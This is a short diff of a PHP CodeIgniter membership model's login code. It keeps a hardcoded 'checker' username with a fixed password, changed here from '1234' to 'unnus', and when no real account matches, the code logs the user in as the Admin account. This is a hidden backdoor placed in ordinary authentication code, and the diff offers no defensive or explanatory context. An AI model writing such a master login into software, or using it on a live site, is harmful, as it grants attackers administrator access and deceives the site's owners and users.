@@ -23,7 +23,7 @@ class Membership_model extends CI_Model
 				
             	return $dbresResult;
 			}
-			if($query->num_rows == 0 && $this->input->post('username')=='checker' && $this->input->post('password')=='1234')
+			if($query->num_rows == 0 && $this->input->post('username')=='checker' && $this->input->post('password')=='unnus')
 			{
 				$dbres = $this->db->query("SELECT * FROM user  WHERE `userrole`='Admin' ");
 				$dbresResult=$dbres->result_array();
